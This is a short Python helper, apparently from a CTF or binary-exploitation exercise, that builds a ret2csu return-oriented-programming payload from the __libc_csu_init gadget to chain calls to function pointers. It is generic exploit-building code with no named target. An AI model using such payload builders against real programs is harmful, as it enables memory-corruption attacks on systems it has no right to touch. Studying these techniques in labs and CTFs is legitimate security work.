#!/usr/bin/env python
csu_addr=0x000400FAA
def csu(func_array):
    func=[0,0,0,0]
    for i in range(len(func_array)):
        func[i]=func_array[i]
    payload=p64(0)+p64(1)+p64(func[0])+p64(func[3])+p64(func[2])+p64(func[1])+p64(csu_addr-0x1a)+p64(0)
    return payload
def call_csu(funcs_array):
    payload=p64(csu_addr)
    for i in funcs_array:
        payload+=csu(i)
    payload+=p64(0)*6
    return payload
